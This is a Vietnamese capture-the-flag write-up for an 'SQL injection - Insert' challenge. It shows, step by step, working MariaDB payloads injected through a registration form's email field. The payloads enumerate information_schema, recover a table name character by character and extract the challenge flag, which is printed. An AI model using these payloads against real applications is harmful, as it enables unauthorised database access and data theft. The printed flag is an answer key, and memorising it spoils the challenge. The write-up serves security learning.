# SQL injection - Insert
## Solution

![image](https://user-images.githubusercontent.com/86184794/162602227-38605f9a-10a6-43a9-8371-b503ecf84fb2.png)

Ban đầu challenge cho em 1 giao diện website như thế này. Có 2 tab cần chú ý là Authentication và Register.

![image](https://user-images.githubusercontent.com/86184794/162602256-df08ce8c-b474-4596-92b4-989e01e8d35f.png)

Em thử 1 tài khoản chưa được đăng ký challenge thông báo lỗi.

![image](https://user-images.githubusercontent.com/86184794/162602278-bd1d0ccf-de33-421b-b7d8-2decf23045af.png)

Sau khi đăng ký thành công thì được thông báo như hình.

![image](https://user-images.githubusercontent.com/86184794/162602289-f780221b-86d3-47a0-b27c-e00fd06a4a81.png)

Ở tab Register sau khi test thì có một số filter như sau:

- Username và password thì filter các kí tự đặc biệt.

- Email thì filter `substring`, `insert`

Database mà server sử dụng là MariaDB.

Bây giờ ta bắt đầu vào khai thác challenge. Ý tưởng là trong câu lệnh `Insert` em có thể thêm vào nhiều bộ giá trị vì thế em có thể tận dụng trường email là trường cuối cùng trong bộ giá trị để thêm những câu SQL vào.

Input:
```
1') , ('1', '1', (select group_concat(table_name) from information_schema.tables) ) ; -- 
```

![image](https://user-images.githubusercontent.com/86184794/162603146-cbf892bf-561d-4b4a-bbb5-b11e68db8730.png)

Sau khi user được đăng ký thành công thì em sẽ kích nó ở trong form login để nhận về giá trị của các bảng trong database.

Username: `1`

Password: `1`

![image](https://user-images.githubusercontent.com/86184794/162604364-6b046ceb-4b12-4ece-83b1-0775f0fc2d92.png)

Để ý rằng chuỗi được in ra bị giới hạn độ dài. Vì thế chắc giờ em sẽ phải đi select ra từng dòng trong bảng `information_schema.tables`.

Giờ phải in ra số dòng xem sao.
```
a1') , ('b2', 'b2', (select count(table_name) from information_schema.tables) ) ; -- 
```

![image](https://user-images.githubusercontent.com/86184794/162604508-fb70a938-c6e8-4be2-8b1a-3c6df57ddc30.png)

Database có 80 dòng.

Haizz giờ select ra từng dòng thì hơi căng.

Lưu ý là các bảng được tạo trong MariaDB sẽ nằm ở cuối.

Nên giờ em sẽ cố gắng hiện ra tên của các table cuối trong bảng.

Tiếp tục search google thì em tìm được hàm ascii() dùng để chuyển kí tự sang số.

Ví dụ:

ascii("binh")=ascii("b")= 98

Nếu ta nhập 1 chuỗi vào hàm ascii() thì nó chỉ convert kí tự đầu tiên của chuỗi.

Như vậy để in ra hết chuỗi thì sau mỗi lần in chúng ta sẽ xóa kí tự đầu tiên của chuỗi đi.

Input:
```
1') , ('bi10', '1', (select char(ascii(table_name)) from information_schema.tables limit 79, 1)); -- 
```
Username: `bi10`

Password: `1`

![image](https://user-images.githubusercontent.com/86184794/162605240-0e713ff5-1a26-42bf-9354-8e777a8eb307.png)

Kí tự đầu tiên của bảng cuối cùng là chữ `f`.

Giờ em sẽ xóa kí tự đầu tiên này bằng hàm replace().

Input:
```
1') , ('bi12', '1', (select char(ascii(replace(table_name, 'f', ''))) from information_schema.tables limit 79, 1)); -- 
```
![image](https://user-images.githubusercontent.com/86184794/162605385-4e6c68c7-8640-4c81-8489-e6e9c89abe97.png)

Đây là chữ `l`

Input:
```
1') , ('bi13', '1', (select char(ascii(replace(table_name, 'fl', ''))) from information_schema.tables limit 79, 1)); -- 
```
![image](https://user-images.githubusercontent.com/86184794/162605433-7e188ec9-acdb-4bd0-8821-96619dbf7d3b.png)

Đây là chữ `a`

Input:
```
1') , ('bi14', '1', (select char(ascii(replace(table_name, 'fla', ''))) from information_schema.tables limit 79, 1)); -- 
```

![image](https://user-images.githubusercontent.com/86184794/162605497-a6ae2959-8791-43a3-84ae-ee195129c9b6.png)

Đây là chữ `g`

Vậy 99% đây bảng cuối cùng này có tên là `flag`.

Giờ em sẽ in ra tất cả các trường trong table flag.

Input:
```
1') , ('bi15', '1', (select group_concat(column_name) from information_schema.columns where table_name='flag')); -- 
```
![image](https://user-images.githubusercontent.com/86184794/162605584-0e53cd80-a5d1-49f5-a164-36694e8c155c.png)

Trong table `flag` chỉ có 1 trường cũng tên là `flag` luôn

Input:
```
1') , ('bi21', '1', (select flag from flag )); -- 
```
![image](https://user-images.githubusercontent.com/86184794/162605680-56684f43-373d-497e-84b9-53a08b6be352.png)

Flag: moaZ63rVXUhlQ8tVS7Hw

